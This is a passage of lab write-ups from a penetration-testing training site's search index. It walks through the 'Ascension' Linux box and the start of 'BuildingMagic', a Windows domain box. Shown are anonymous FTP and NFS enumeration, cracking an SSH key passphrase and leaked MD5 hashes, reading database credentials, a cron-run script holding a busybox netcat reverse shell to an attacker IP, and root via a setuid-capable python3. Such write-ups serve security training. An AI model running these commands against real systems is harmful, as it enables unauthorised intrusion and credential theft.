works\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      44795/tcp6  mountd\n|   100005  1,2,3      51453/tcp   mountd\n|   100005  1,2,3      51868/udp6  mountd\n|   100005  1,2,3      58443/udp   mountd\n|   100021  1,3,4      38711/tcp   nlockmgr\n|   100021  1,3,4      43151/udp   nlockmgr\n|   100021  1,3,4      46647/tcp6  nlockmgr\n|   100021  1,3,4      52811/udp6  nlockmgr\n|   100024  1          33921/tcp6  status\n|   100024  1          42310/udp   status\n|   100024  1          46425/udp6  status\n|   100024  1          50455/tcp   status\n|   100227  3           2049/tcp   nfs_acl\n|_  100227  3           2049/tcp6  nfs_acl\n2049/tcp  open  nfs_acl  3 (RPC #100227)\n38711/tcp open  nlockmgr 1-4 (RPC #100021)\n48461/tcp open  mountd   1-3 (RPC #100005)\n50455/tcp open  status   1 (RPC #100024)\n51453/tcp open  mountd   1-3 (RPC #100005)\n60283/tcp open  mountd   1-3 (RPC #100005)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 49.14 seconds\n</code></pre>"},{"location":"HackSmarter-Labs/ascension/#ftp-enumeration","title":"FTP Enumeration","text":"<p>Based on <code>-sC</code> flag on the nmap script, I see <code>anonymous login</code> is allowed. Let\u2019s test it out on <code>nxc</code></p> <pre><code>nxc ftp 10.1.98.83 -u '' -p ''  \nFTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)\nFTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!\n</code></pre> <p>Next step would be to enumerate <code>FTP</code> File share and probably download a possible file</p> <pre><code>nxc ftp 10.1.98.83 -u '' -p '' --ls\nFTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)\nFTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!\nFTP         10.1.98.83      21     10.1.98.83       [*] Directory Listing\nFTP         10.1.98.83      21     10.1.98.83       -rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt\n\u279c  Ascension nxc ftp 10.1.98.83 -u '' -p '' --get pwlist.txt\nFTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)\nFTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!\nFTP         10.1.98.83      21     10.1.98.83       [+] Downloaded: pwlist.txt\n</code></pre> <p>We have a <code>pwlist.txt</code> file. It is a password file.</p>"},{"location":"HackSmarter-Labs/ascension/#http-enumeration","title":"HTTP Enumeration","text":"<p>Nothing much on the default Apache webpage</p> <p></p> <p>I will bruteforce for sub-domains and/or sub-directories using both <code>ffuf</code> and <code>Gobuster</code></p>"},{"location":"HackSmarter-Labs/ascension/#vhost","title":"VHOST","text":"<p>Nothing on <code>vhost</code> bruteforcing</p> <pre><code>gobuster vhost -u http://10.1.98.83 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --append-domain\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://10.1.98.83\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nProgress: 4723 / 4724 (99.98%)\n===============================================================\nFinished\n===============================================================\n</code></pre>"},{"location":"HackSmarter-Labs/ascension/#sub-directory","title":"Sub-Directory","text":"<p>Let\u2019s go, I have something</p> <pre><code>ffuf -u 'http://10.1.98.83/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.1.98.83/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 26ms]\n.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3026ms]\n.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3111ms]\nindex.php               [Status: 500, Size: 4, Words: 1, Lines: 5, Duration: 26ms]\nindex.html              [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 27ms]\nserver-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 30ms]\nwp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 27ms]\nwp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 27ms]\nwp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 27ms]\nxmlrpc.php              [Status: 500, Size: 4, Words: 1, Lines: 5, Duration: 92ms]\n:: Progress: [4723/4723] :: Job [1/1] :: 925 req/sec :: Duration: [0:00:06] :: Errors: 0 ::\n</code></pre>"},{"location":"HackSmarter-Labs/ascension/#enumeration-rpc","title":"Enumeration RPC","text":"<pre><code>[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) &gt;&gt; options\n\nModule options (auxiliary/scanner/nfs/nfsmount):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   HOSTNAME                   no        Hostname to match shares against\n   LHOST     192.168.52.145   no        IP to match shares against\n   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)\n   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT     111              yes       The target port (TCP)\n   THREADS   1                yes       The number of concurrent threads (max one per host)\n\nView the full module info with the info, or info -d command.\n\n[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) &gt;&gt; set RHOST 10.1.98.83\nRHOST =&gt; 10.1.98.83\n[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) &gt;&gt; set LHOST 10.200.21.18\nLHOST =&gt; 10.200.21.18\n[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) &gt;&gt; set PROTOCOL tcp\nPROTOCOL =&gt; tcp\n[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) &gt;&gt; run\n[+] 10.1.98.83:111        - 10.1.98.83 Mountable NFS Export: /srv/nfs/user1 [*]\n[*] 10.1.98.83:111        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>I get a Mountable NFS Export <code>/srv/nfs/user1</code></p> <p>NB: Install <code>nsf-common</code> if necessary</p> <pre><code>Ascension: sudo mount 10.1.98.83:/srv/nfs/user1 /mnt/nfs_share  \nAscension: sudo mkdir /mnt/nfs_share\nAscension: ls -l /mnt/nfs_share \n   rw-r--r--   1   1001   parrot      2 KiB   Sun Sep 21 13:31:43 2025  \uf15b  id_rsa \n   rw-r--r--   1   1001   parrot    574 B     Sun Sep 21 13:31:45 2025  \uf15b  id_rsa.pub  \n</code></pre> <p>Tried logging using the Private SSH key plus the User1 but it was asking for a passphrase</p> <pre><code>ssh -i id_rsa user1@10.1.98.83\nThe authenticity of host '10.1.98.83 (10.1.98.83)' can't be established.\nED25519 key fingerprint is SHA256:aOJ2e6+SAGwdNAJNRYWEP+60jtNlOB7N9WFyPUgTmdU.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.1.98.83' (ED25519) to the list of known hosts.\nEnter passphrase for key 'id_rsa': \nuser1@10.1.98.83: Permission denied (publickey).\n</code></pre> <p><code>SSH2John</code> can brute force ssh pass phrases</p> <pre><code>\u279c  Ascension ssh2john id_rsa &gt; ssh.john\n\u279c  Ascension ls   \n     \uf15b  id_rsa      \uf15c  pwlist.txt      \uf15b  ssh.john \n\u279c  Ascension sudo john --wordlist=/usr/share/wordlists/rockyou.txt ssh.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes\nCost 2 (iteration count) is 24 for all loaded hashes\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsammie1          (id_rsa)     \n1g 0:00:04:04 DONE (2025-11-21 21:56) 0.004092g/s 21.01p/s 21.01c/s 21.01C/s damnit..flaca\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>Use the cracked passphrase and login to the User1 account</p> <pre><code>ssh -i id_rsa user1@10.1.98.83 \nEnter passphrase for key 'id_rsa': \nWelcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1012-aws x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sat Nov 22 03:07:08 UTC 2025\n\n  System load:  0.24              Temperature:           -273.1 C\n  Usage of /:   41.5% of 6.71GB   Processes:             142\n  Memory usage: 35%               Users logged in:       0\n  Swap usage:   0%                IPv4 address for ens5: 10.1.98.83\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Sun Sep 21 17:45:17 2025 from 10.0.0.247\nuser1@ip-10-1-98-83:~$ ls\n</code></pre> <p>Found the <code>user1</code>  flag</p> <pre><code>user1@ip-10-1-98-83:/opt$ ls\nftpuser  root  user1  user2  user3\nuser1@ip-10-1-98-83:/opt$ cd user\nuser1/ user2/ user3/ \nuser1@ip-10-1-98-83:/opt$ cd user1\nuser1@ip-10-1-98-83:/opt/user1$ ls\nflag1\nuser1@ip-10-1-98-83:/opt/user1$ cat flag1 \nRkxBRzF7aGpzeXU4OTIzMzRoam9obnNkOHkyOTNoNH0=\n</code></pre> <p>Also found this when I ran <code>linpeas.sh</code></p> <pre><code>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Wordpress Files (limit 70)\n-rw-r--r-- 1 root root 153 Sep 21 00:04 /var/www/html/wp-config.php\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wpuser');\ndefine('DB_PASSWORD', 'wppassword');\ndefine('DB_HOST', 'localhost');\n</code></pre> <p>Let\u2019s interact with the <code>mysql</code> server</p> <pre><code>user1@ip-10-1-98-83:/opt/user1$ mysql -u wpuser -D wordpress -h localhost -p\nEnter password: \nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 17\nServer version: 8.0.43-0ubuntu0.24.04.2 (Ubuntu)\n\nCopyright (c) 2000, 2025, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; \n\nmysql&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| performance_schema |\n| wordpress          |\n+--------------------+\n3 rows in set (0.00 sec)\n\nmysql&gt; use wordpress \nDatabase changed\nmysql&gt; show tables\n    -&gt; ;\n+---------------------+\n| Tables_in_wordpress |\n+---------------------+\n| flags               |\n| users               |\n+---------------------+\n2 rows in set (0.00 sec)\n\nmysql&gt; SELECT * FROM flags;\n+----+------------------------------------------+\n| id | flag                                     |\n+----+------------------------------------------+\n|  1 | RkxBRzR7d2ViamhuYXNkMzg5MjM0a25kam9pM2R9 |\n+----+------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql&gt; SELECT * FROM users;\n+----+----------+---------------+\n| id | username | password      |\n+----+----------+---------------+\n|  1 | user3    | user3password |\n+----+----------+---------------+\n1 row in set (0.00 sec)\n</code></pre> <p>I think I missed <code>user2</code> creds. I have to go back and get it</p> <p>Found this to be very handy when dealing with processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.</p> <p>GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions</p> <pre><code>user1@ip-10-1-98-83:/tmp$ ss -tulnp\nNetid           State            Recv-Q           Send-Q                       Local Address:Port                      Peer Address:Port          Process          \nudp             UNCONN           0                0                               127.0.0.54:53                             0.0.0.0:*                           \nudp             UNCONN           0                0                            127.0.0.53%lo:53                             0.0.0.0:*                              \nudp             UNCONN           0                0                          10.1.98.83%ens5:68                             0.0.0.0:*                              \nudp             UNCONN           0                0                                  0.0.0.0:58443                          0.0.0.0:*                              \nudp             UNCONN           0                0                                  0.0.0.0:111                            0.0.0.0:*                              \nudp             UNCONN           0                0                                  0.0.0.0:43151                          0.0.0.0:*                              \nudp             UNCONN           0                0                                127.0.0.1:323                            0.0.0.0:*                              \nudp             UNCONN           0                0                                  0.0.0.0:42310                          0.0.0.0:*                              \nudp             UNCONN           0                0                                  0.0.0.0:38327                          0.0.0.0:*                              \nudp             UNCONN           0                0                                  0.0.0.0:37412                          0.0.0.0:*                              \nudp             UNCONN           0                0                                127.0.0.1:802                            0.0.0.0:*                              \nudp             UNCONN           0                0                                     [::]:46159                             [::]:*                              \nudp             UNCONN           0                0                                     [::]:111                               [::]:*                              \nudp             UNCONN           0                0                                     [::]:49321                             [::]:*                              \nudp             UNCONN           0                0                                    [::1]:323                               [::]:*                          \nudp             UNCONN           0                0                                     [::]:46425                             [::]:*                              \n</code></pre> <pre><code>user1@ip-10-1-98-83:/tmp$ ./pspy64 \npspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d\n\n     \u2588\u2588\u2593\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593\u2588\u2588\u2588 \u2593\u2588\u2588   \u2588\u2588\u2593\n    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588  \u2588\u2588\u2592\n    \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2591 \u2593\u2588\u2588\u2584   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592 \u2592\u2588\u2588 \u2588\u2588\u2591\n    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592 \u2591 \u2590\u2588\u2588\u2593\u2591\n    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2591 \u2588\u2588\u2592\u2593\u2591\n    \u2592\u2593\u2592\u2591 \u2591  \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591  \u2591  \u2588\u2588\u2592\u2592\u2592 \n    \u2591\u2592 \u2591     \u2591 \u2591\u2592  \u2591 \u2591\u2591\u2592 \u2591     \u2593\u2588\u2588 \u2591\u2592\u2591 \n    \u2591\u2591       \u2591  \u2591  \u2591  \u2591\u2591       \u2592 \u2592 \u2591\u2591  \n                   \u2591           \u2591 \u2591     \n                               \u2591 \u2591     \n\nConfig: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)\nDraining file system events due to startup...\ndone\n2025/11/22 04:41:08 CMD: UID=1001  PID=55049  | ./pspy64\n&lt;&lt; SNIP &gt;&gt;\n2025/11/22 04:42:01 CMD: UID=1002  PID=55066  | /bin/sh -c /tmp/backup.sh \n2025/11/22 04:42:01 CMD: UID=1002  PID=55067  | /bin/sh -c /tmp/backup.sh \n2025/11/22 04:42:01 CMD: UID=1002  PID=55070  | \n2025/11/22 04:42:01 CMD: UID=1002  PID=55068  | /bin/sh -c /tmp/backup.sh \n2025/11/22 04:43:01 CMD: UID=0     PID=55076  | /usr/sbin/cron -f -P \n2025/11/22 04:43:01 CMD: UID=0     PID=55075  | /usr/sbin/cron -f -P \n2025/11/22 04:43:01 CMD: UID=0     PID=55074  | /usr/sbin/cron -f -P \n2025/11/22 04:43:01 CMD: UID=0     PID=55073  | /usr/sbin/CRON -f -P \n2025/11/22 04:43:01 CMD: UID=0     PID=55072  | /usr/sbin/CRON -f -P \n</code></pre> <p>There is a process (Cron) running on <code>/tmp/backup.sh</code> as the <code>user2</code></p> <p>Since there is no <code>backup.sh</code> in <code>/tmp</code>. I will create mine and place a Reserve shell in it</p> <pre><code>user1@ip-10-1-98-83:/tmp$ cat backup.sh \n#!/bin/bash\nbusybox nc 10.200.21.18 4444 -e /bin/bash\n</code></pre> <p>Start a <code>netcat</code> and run the <code>pspy64</code> to catch the reverse shell</p> <pre><code>nc -lvnp 4444 \nListening on 0.0.0.0 4444\nConnection received on 10.1.98.83 59672\nwhoami\nuser2\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nuser2@ip-10-1-98-83:~$ ls\nls\nuser2@ip-10-1-98-83:~$ cd /opt  \ncd /opt\nuser2@ip-10-1-98-83:/opt$ ls\nls\nftpuser  root  user1  user2  user3\nuser2@ip-10-1-98-83:/opt$ cd user2\ncd user2\nuser2@ip-10-1-98-83:/opt/user2$ ls\nls\nflag2\nuser2@ip-10-1-98-83:/opt/user2$ cat flag2\ncat flag2\nRkxBRzJ7c2RoaDk4MjM0bmpvaG4za2pkajIzM2ZkfQ==\n</code></pre>"},{"location":"HackSmarter-Labs/ascension/#back-to-user3","title":"Back to User3","text":"<p>After running <code>linpeas.sh</code> I found this</p> <pre><code>Files with capabilities (limited to 50):\n/home/user3/python3 cap_setuid=ep\n/home/user3/python3 cap_setuid=ep is writable\n/snap/core22/2111/usr/bin/ping cap_net_raw=ep\n/snap/core22/2133/usr/bin/ping cap_net_raw=ep\n/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep\n/usr/bin/mtr-packet cap_net_raw=ep\n/usr/bin/ping cap_net_raw=ep\n</code></pre> <p>Check this out!!!!!</p> <p></p> <p>Let\u2019s gooooo</p> <pre><code>user3@ip-10-1-98-83:~$ /home/user3/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@ip-10-1-98-83:~# whoami\nroot\nroot@ip-10-1-98-83:~# ls\npython3\nroot@ip-10-1-98-83:~# cat /opt/ftpuser/flag3 \nRkxBRzN7Z2pkb2huYXNkOTgyMzRram5iY2tkZn0=\n\n&lt;&lt; SNIP &gt;&gt;\n\nroot@ip-10-1-98-83:/opt# ls\nftpuser  root  user1  user2  user3\nroot@ip-10-1-98-83:/opt# cat root/flag6 \nRkxBRzZ7c2RmanVkaGZzODIzNGtqbmJvaG5kamZ9\n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/","title":"BuildingMagic - Write-up","text":""},{"location":"HackSmarter-Labs/buildingmagic/#buildingmagic-write-up","title":"BuildingMagic - Write-up","text":"<p>Note</p> <p>Author: Dcyberguy</p> <p>Status: Published</p> <p>Last edited time: December 11, 2025 10:27 PM</p> <p>Created time: November 26, 2025 2:45 PM</p>"},{"location":"HackSmarter-Labs/buildingmagic/#leaked-database","title":"Leaked Database","text":"<pre><code>id  username    full_name   role        password\n1   r.widdleton Ron Widdleton   Intern Builder  c4a21c4d438819d73d24851e7966229c\n2   n.bottomsworth  Neville Bottomsworth Plannner   61ee643c5043eadbcdc6c9d1e3ebd298\n3   l.layman    Luna Layman Planner     8960516f904051176cc5ef67869de88f\n4   c.smith     Chen Smith  Builder     bbd151e24516a48790b2cd5845e7f148\n5   d.thomas    Dean Thomas Builder     4d14ff3e264f6a9891aa6cea1cfa17cb\n6   s.winnigan  Samuel Winnigan HR Manager  078576a0569f4e0b758aedf650cb6d9a\n7   p.jackson   Parvati Jackson Shift Lead  eada74b2fa7f5e142ac412d767831b54\n8   b.builder   Bob Builder Electrician dd4137bab3b52b55f99f18b7cd595448\n9   t.ren       Theodore Ren    Safety Officer  bfaf794a81438488e57ee3954c27cd75\n10  e.macmillan Ernest Macmillan Surveyor   47d23284395f618bea1959e710bc68ef\n</code></pre> <p>Filtering out only the <code>md5</code> hashes</p> <pre><code>awk '{print $2 \":\" $NF}' leak-db.txt\nr.widdleton:c4a21c4d438819d73d24851e7966229c\nn.bottomsworth:61ee643c5043eadbcdc6c9d1e3ebd298\nl.layman:8960516f904051176cc5ef67869de88f\nc.smith:bbd151e24516a48790b2cd5845e7f148\nd.thomas:4d14ff3e264f6a9891aa6cea1cfa17cb\ns.winnigan:078576a0569f4e0b758aedf650cb6d9a\np.jackson:eada74b2fa7f5e142ac412d767831b54\nb.builder:dd4137bab3b52b55f99f18b7cd595448\nt.ren:bfaf794a81438488e57ee3954c27cd75\ne.macmillan:47d23284395f618bea1959e710bc68ef\n</code></pre> <p>Use <code>John the Ripper</code> to cracked for weak and easily to crack password hash.</p> <p>Found: <code>r.widdleton:lilronron</code></p> <pre><code>Building_magic sudo john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt leakeddb.txt\nUsing default input encoding: UTF-8\nLoaded 10 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nRemaining 9 password hashes with no different salts\nWarning: no OpenMP support for this hash type, consider --fork=6\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:01 DONE (2025-11-26 15:47) 0g/s 13404Kp/s 13404Kc/s 120644KC/s  fuckyooh21..*7\u00a1Vamos!\nSession completed. \n\nBuilding_magic sudo john leakeddb.txt --show --format=Raw-MD5\nr.widdleton:lilronron\n\n1 password hash cracked, 9 left\n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#enumeration","title":"Enumeration","text":"<p>Document all enumeration don on the host to find vulnerable and attack paths</p> <pre><code>nmap -Pn -sV -sC -p- --min-rate=200 10.1.142.44 -T4\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-26 15:55 EST\nNmap scan report for buildingmagic.local (10.1.142.44)\nHost is up (0.022s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-26 21:02:44Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: BUILDINGMAGIC\n|   NetBIOS_Domain_Name: BUILDINGMAGIC\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: BUILDINGMAGIC.LOCAL\n|   DNS_Computer_Name: DC01.BUILDINGMAGIC.LOCAL\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-11-26T21:04:09+00:00\n| ssl-cert: Subject: commonName=DC01.BUILDINGMAGIC.LOCAL\n| Not valid before: 2025-09-02T21:29:10\n|_Not valid after:  2026-03-04T21:29:10\n|_ssl-date: 2025-11-26T21:04:48+00:00; -1s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n8080/tcp  open  http-proxy    Werkzeug/3.1.3 Python/3.13.3\n|_http-server-header: Werkzeug/3.1.3 Python/3.13.3\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/3.1.3 Python/3.13.3\n|     Date: Wed, 26 Nov 2025 21:02:44 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 2222\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;title&gt;Building Magic Application Portal&lt;/title&gt;\n|     &lt;link href=\"https://fonts.googleapis.com/css2?family=Cinzel&amp;display=swap\" rel=\"stylesheet\"&gt;\n|     &lt;style&gt;\n|     body {\n|     font-family: 'Cinzel', serif;\n|     background: url('/static/working.jpg') no-repeat center center fixed;\n|     background-size: cover;\n|     color: white;\n|     text-align: center;\n|     padding: 50px;\n|     form {\n|     background: rgba(0, 0, 0, 0.7);\n|     padding: 40px;\n|     border-radius: 15px;\n|     display: inline-block;\n|     box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);\n|     input, textarea {\n|     width: 90\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/3.1.3 Python/3.13.3\n|     Date: Wed, 26 Nov 2025 21:02:44 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Allow: GET, HEAD, OPTIONS\n|     Content-Length: 0\n|     Connection: close\n|   RTSPRequest: \n|     &lt;!DOCTYPE HTML&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 400&lt;/p&gt;\n|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n|_http-title: Building Magic Application Portal\n9389/tcp  open  mc-nmf        .NET Message Framing\n49670/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc         Microsoft Windows RPC\n49713/tcp open  msrpc         Microsoft Windows RPC\n49853/tcp open  msrpc         Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\n\n&lt;&lt; SNIP &gt;&gt;\n\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-11-26T21:04:09\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#smb-enumeration","title":"SMB Enumeration","text":"<p>Enumerating Port 139, 445 with the just above cracked credentials</p> <pre><code>nxc smb 10.1.142.44 -u r.widdleton -p 'lilronron'\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\r.widdleton:lilronron\n\n\n\nnxc smb 10.1.142.44 -u r.widdleton -p 'lilronron' --users\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\r.widdleton:lilronron \nSMB         10.1.142.44     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                     \nSMB         10.1.142.44     445    DC01             Administrator                 2025-06-15 02:00:21 0       Built-in account for administering the computer/domain\nSMB         10.1.142.44     445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain\nSMB         10.1.142.44     445    DC01             krbtgt                        2025-05-05 22:18:37 0       Key Distribution Center Service Account \nSMB         10.1.142.44     445    DC01             h.potch                       2025-09-02 17:56:09 0        \nSMB         10.1.142.44     445    DC01             r.widdleton                   2025-05-15 21:08:40 0        \nSMB         10.1.142.44     445    DC01             r.haggard                     2025-05-15 21:09:04 0        \nSMB         10.1.142.44     445    DC01       